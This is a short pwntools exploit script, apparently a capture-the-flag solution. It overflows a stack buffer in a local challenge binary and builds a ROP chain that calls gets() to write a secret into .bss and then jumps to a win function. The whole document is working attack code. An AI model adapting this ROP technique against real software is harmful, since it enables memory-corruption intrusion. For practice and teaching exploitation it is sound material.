from pwn import *

context.binary = elf = ELF("./secrets", checksec=False)
p = process()

# Address of gadgets and functions
pop_rdi = elf.symbols['pop_rdi_ret']   # defined inline
win = elf.symbols['win']
bss = 0x0000000000404060                        # use readelf -S to get .bss
gets = elf.symbols['gets']            # optional for input

# Payload
payload = flat(
    b"A" * 72,             # buffer
    0x0deadbeefdeadbeef,   # placeholder for canary (skip if disabled)
    0x0badc0debadc0de,     # saved RBP
    pop_rdi,
    bss,
    gets,                  # write "supersecret" to .bss
    pop_rdi,
    bss,
    win                    # call win(bss)
)

p.sendlineafter("Enter your input: ", payload)
p.sendline(b"supersecret")  # send the actual secret
p.interactive()

